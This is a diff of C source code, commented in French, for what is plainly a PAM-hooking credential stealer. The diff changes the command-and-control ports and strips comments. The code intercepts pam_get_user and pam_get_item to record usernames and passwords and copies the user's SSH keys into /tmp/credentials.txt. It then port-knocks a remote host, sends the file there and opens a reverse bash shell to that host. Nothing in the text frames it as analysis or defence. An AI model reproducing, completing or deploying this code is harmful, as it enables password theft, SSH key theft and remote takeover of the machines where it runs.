@@ -16,33 +16,30 @@
 #include <utmp.h>
 #include <pwd.h>
 
-// ------------------------------------------------------------------
+
 // Pointeurs vers les fonctions PAM originale
+
 typedef int (*pam_get_item_t)(const pam_handle_t *, int, const void **);
 typedef int (*pam_get_user_t)(pam_handle_t *, const char **, const char *);
 
 static pam_get_item_t original_pam_get_item = NULL;
 static pam_get_user_t original_pam_get_user = NULL;
 
-// ------------------------------------------------------------------
-// Configuration de base
-// ------------------------------------------------------------------
 #define CREDENTIALS_FILE "/tmp/credentials.txt"
 
 // Adresse/ports du C2
 #define REMOTE_HOST       "192.168.64.11"
-#define KNOCK_PORT1       5001
-#define KNOCK_PORT2       5002
-#define KNOCK_PORT3       5003
-#define CREDENTIALS_PORT  4444
-#define SHELL_PORT        4445
+#define KNOCK_PORT1       5432
+#define KNOCK_PORT2       5543
+#define KNOCK_PORT3       5554
+#define CREDENTIALS_PORT  5555
+#define SHELL_PORT        6666
 
 // Stocke l’utilisateur intercepté (pour retrouver son répertoire .ssh)
 static char g_username[256] = {0};
 
-// ------------------------------------------------------------------
 // Utilitaires
-// ------------------------------------------------------------------
+
 static const char *get_current_time() {
     static char buffer[20];
     time_t raw_time = time(NULL);
@@ -61,9 +58,8 @@ static void write_to_file(const char *type, const char *data) {
     fclose(file);
 }
 
-// ------------------------------------------------------------------
 // Ajout des clés SSH dans /tmp/credentials.txt
-// ------------------------------------------------------------------
+
 static void append_ssh_keys_to_file(const char *home_dir) {
     if (!home_dir || !*home_dir) {
         syslog(LOG_ERR, "[ERROR] Impossible de déterminer le répertoire personnel.");
@@ -102,9 +98,8 @@ static void append_ssh_keys_to_file(const char *home_dir) {
     fclose(fp);
 }
 
-// ------------------------------------------------------------------
 // Port knocking et envoi du fichier
-// ------------------------------------------------------------------
+
 static int port_knock(const char *ip, int port) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
@@ -117,7 +112,7 @@ static int port_knock(const char *ip, int port) {
     srv.sin_port   = htons(port);
     inet_pton(AF_INET, ip, &srv.sin_addr);
     
-    connect(sock, (struct sockaddr*)&srv, sizeof(srv)); // Pas grave si échoue
+    connect(sock, (struct sockaddr*)&srv, sizeof(srv));
     close(sock);
     return 0;
 }
@@ -156,9 +151,8 @@ static void send_file_tcp(const char *ip, int remote_port) {
     close(sock);
 }
 
-// ------------------------------------------------------------------
 // Lancement du reverse shell via forkpty()
-// ------------------------------------------------------------------
+
 static void launch_reverse_shell(const char *ip, int port) {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) {
@@ -182,11 +176,9 @@ static void launch_reverse_shell(const char *ip, int port) {
         _exit(0);
     }
     if (pid == 0) {
-        // Processus enfant : lance un shell interactif
         execl("/bin/bash", "bash", "-i", NULL);
         _exit(0);
     } else {
-        // Processus parent : transfère données entre le socket et la pseudo-tty
         char buffer[1024];
         fd_set fds;
         int nfds = (sock > master_fd ? sock : master_fd) + 1;
@@ -213,9 +205,8 @@ static void launch_reverse_shell(const char *ip, int port) {
     }
 }
 
-// ------------------------------------------------------------------
 // Intercepteurs PAM
-// ------------------------------------------------------------------
+
 int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
     if (!original_pam_get_user) {
         original_pam_get_user = (pam_get_user_t)dlsym(RTLD_NEXT, "pam_get_user");
@@ -226,11 +217,9 @@ int pam_get_user(pam_handle_t *pamh, const char **user, const char *prompt) {
     }
     int retval = original_pam_get_user(pamh, user, prompt);
     if (retval == PAM_SUCCESS && *user) {
-        // On stocke l'utilisateur dans g_username pour déterminer son répertoire .ssh
         memset(g_username, 0, sizeof(g_username));
         strncpy(g_username, *user, sizeof(g_username) - 1);
 
-        // Écrit le login dans le fichier
         write_to_file("Login", *user);
     }
     return retval;
@@ -246,11 +235,9 @@ int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
     }
     int retval = original_pam_get_item(pamh, item_type, item);
     if (retval == PAM_SUCCESS && item_type == PAM_AUTHTOK && item && *item) {
-        // Écrit le mot de passe intercepté
         const char *password = (const char*)(*item);
         write_to_file("Password", password);
         
-        // Récupère le répertoire personnel exact via getpwnam(g_username)
         if (g_username[0] != '\0') {
             struct passwd *pw = getpwnam(g_username);
             if (pw && pw->pw_dir) {
@@ -258,7 +245,6 @@ int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
             }
         }
 
-        // Port knocking
         port_knock(REMOTE_HOST, KNOCK_PORT1);
         sleep(1);
         port_knock(REMOTE_HOST, KNOCK_PORT2);
@@ -266,10 +252,8 @@ int pam_get_item(const pam_handle_t *pamh, int item_type, const void **item) {
         port_knock(REMOTE_HOST, KNOCK_PORT3);
         sleep(1);
 
-        // Envoi du fichier
         send_file_tcp(REMOTE_HOST, CREDENTIALS_PORT);
 
-        // Reverse shell dans un processus enfant
         pid_t shell_pid = fork();
         if (shell_pid == 0) {
             launch_reverse_shell(REMOTE_HOST, SHELL_PORT);
